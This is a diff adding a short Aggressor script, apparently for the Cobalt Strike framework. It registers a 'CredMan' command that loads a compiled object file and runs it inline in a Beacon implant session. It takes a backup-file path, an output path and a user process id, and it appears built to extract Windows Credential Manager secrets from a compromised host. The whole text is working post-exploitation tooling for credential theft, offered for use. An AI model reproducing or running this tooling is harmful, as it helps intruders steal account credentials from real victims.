@@ -1,0 +1,20 @@
+alias CredMan {
+	local('$handle $data $args $2 $3 $4');
+
+    if(size(@_) != 4){
+        berror($1, "CredMan: not enough arguments,Usage: CredMan [encrypted backup file location][decrypted backup file location][user process id] ");
+        return;
+    }
+
+    $handle = openf(script_resource("CredMan.o"));
+    $data   = readb($handle, -1);
+    closef($handle)
+
+    $args = bof_pack($1,"ZZi",$2,$3,$4);
+
+	btask($1, "Running CredMan");
+
+
+	beacon_inline_execute($1,$data,"go",$args);
+}
+
